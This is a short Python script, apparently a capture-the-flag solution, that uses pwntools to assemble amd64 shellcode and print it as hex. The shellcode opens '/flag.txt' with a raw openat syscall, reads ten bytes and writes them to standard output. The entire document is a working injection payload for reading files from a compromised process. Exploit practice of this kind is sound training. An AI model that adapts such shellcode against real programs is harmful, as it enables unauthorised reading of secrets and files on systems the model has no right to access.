import pwn

pwn.context.arch = "amd64"

s = """
mov eax, 0x101

mov r10, 0x0000000000000074
push r10
mov r10, 0x78742e67616c662f
push r10

mov rsi, rsp
mov rdi, -100
mov rdx, 0
syscall

mov rdi, rax
mov rsi, rsp
mov edx, 10
mov eax, 0x0
syscall

mov eax, 0x1
mov rdi, rax
syscall
"""

a = pwn.asm(s)
print(a.hex())
